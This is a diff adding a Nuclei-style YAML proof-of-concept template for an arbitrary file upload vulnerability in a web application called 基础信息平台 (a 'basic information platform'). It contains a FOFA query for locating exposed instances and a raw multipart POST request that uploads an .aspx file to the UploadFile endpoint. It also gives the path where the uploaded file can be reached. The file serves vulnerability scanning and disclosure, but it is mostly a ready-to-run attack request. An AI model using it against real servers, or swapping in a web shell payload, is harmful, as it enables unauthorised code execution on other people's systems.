@@ -1,0 +1,56 @@
+id: poc-seregidn0vyiag6g
+info:
+  name: 基础信息平台UploadFile 存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/seregidn0vyiag6g'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: seregidn0vyiag6g
+    fofa: body="/SystemManage/BaseProject" || title=="基础信息平台"
+http:
+- raw:
+  - 'POST /SystemManage/BaseProject/UploadFile HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: ASP.NET_SessionId=rwqnflza5hjg0bunbihx43ci
+
+    Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
+
+    Sec-Ch-Ua-Mobile: ?0
+
+    Sec-Ch-Ua-Platform: "Windows"
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Connection: close
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySnhtXyWF1OLXjDOr
+
+    Content-Length: 1578
+
+
+    ------WebKitFormBoundarySnhtXyWF1OLXjDOr
+
+    Content-Disposition: form-data; name="file";filename="yy.aspx"
+
+
+    123
+
+    ------WebKitFormBoundarySnhtXyWF1OLXjDOr--
+
+
+    上传定位
+
+    /Content/images/projectImage/yy.aspx'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
